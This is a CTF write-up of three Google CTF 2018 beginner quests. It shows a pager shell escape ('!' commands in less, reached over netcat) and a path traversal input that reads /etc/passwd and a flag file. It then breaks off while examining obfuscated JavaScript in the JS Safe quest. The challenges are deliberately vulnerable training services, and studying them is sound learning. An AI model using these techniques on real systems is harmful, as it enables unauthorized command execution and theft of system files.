# Time For Moar Google CTF 2018

[Last time](Google_CTF_2018_1.html), I explored the first five beginner's
quests of Google CTF 2018, and now, it's time for MOAR!

## Moar

The quest prompt gave a `netcat` server address, let's connect and see what's
over on the other side:

```
$ nc moar.ctfcompetition.com 1337
[...]
NAME
       socat - Multipurpose relay (SOcket CAT)

SYNOPSIS
       socat [options] <address> <address>
       socat -V
       socat -h[h[h]] | -?[?[?]]
       filan
       procan
[...]
```

It is the `man` page for `socat`, over the pager `less`. Tying `q` would drop
the connection. What about `h`? It opens the help text, but it is too hard to
read over `netcat`. I opened a local copy of `less` and found:

```
[...]
  !command             Execute the shell command with $SHELL.
  |Xcommand            Pipe file between current pos & mark X to shell command.
[...]
```

Time to try it:

```
$ nc moar.ctfcompetition.com 1337
! ls /
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
! ls ~
ls: cannot access '/home/unprivileged': No such file or directory
! ls /home
moar
! ls /home/moar
disable_dmz.sh
! /home/moar/disable_dmz.sh
Disabling DMZ using password CTF{SOmething-CATastr0phic}
/home/moar/disable_dmz.sh: 18: /home/moar/disable_dmz.sh: cannot create /dev/dmz: Read-only file system
```

And there is the flag.

## Admin UI

Another remote exploitation quest:

```
$ nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit

1
Please enter the backdoo^Wservice password:

abcd
Incorrect, the authorities have been informed!
```

Ops, that's not good. What's in the patch notes?

```
[...]
2
The following patchnotes were found:
 - Version0.3
 - Version0.2
Which patchnotes should be shown?

Version0.3
# Version 0.3
 - Rollback of version 0.2 because of random reasons
 - Blah Blah
 - Fix random reboots at 2:32 every second Friday when it's new-moon.

[...]
Version0.2
# Release 0.2
 - Updated library X to version 0.Y
 - Fixed path traversal bug
 - Improved the UX

[...]
Version0.1
Error: No such file or directory
```

Hum, `No such file or directory`? Looks like it will print any file that
exists. I tried `flag` and `flag.txt`, but it didn't work. Looking closer at
the patch notes, version 0.2 mentions something about path traversal bug fix
and 0.3 rolled that back. Is that a hint?

```
[...]
../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```

Oh, it works!

```
[...]
../flag
CTF{I_luv_buggy_sOFtware}
```

## JS Safe

The ZIP file only contains an HTML file. Opening it reveals some HTML, CSS, and
two `<script>` tags. The second one seems to be just the basic functionality of
the webpage, and the first one is the one to investigate. Also, it looks like
the password to the safe is also the flag because the following regular
expression is in the second script tag:

```JavaScript
  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
```

The first script block is (somewhat) obfuscated:

```JavaScript
async function x(password) {
    // TODO: check if they can just use Google to get the password once they understand how this works.
    var code = '<long string removed>'
    var env = {
        a: (x,y) => x[y],
        b: (x,y) => Function.constructor.apply.apply(x, y),
        c: (x,y) => x+y,
        d: (x) => String.fromCharCode(x),
        e: 0,
        f: 1,
        g: new TextEncoder().encode(password),
        h: 0,
    };
    for (var i = 0; i < code.length; i += 4) {
        var [lhs, fn, arg1, arg2] = code.substr(i, 4);
        try {
            env[lhs] = env[fn](env[arg1], env[arg2]);
        } catch(e) {
            env[lhs] = new env[fn](env[arg1], env[arg2]);
        }
        if (env[lhs] instanceof Promise) env[lhs] = await env[lhs];
    }
    return !env.h;
}
```

I would assume the password is pretty long and a brute-force attack will not
work until I can narrow the key space down.


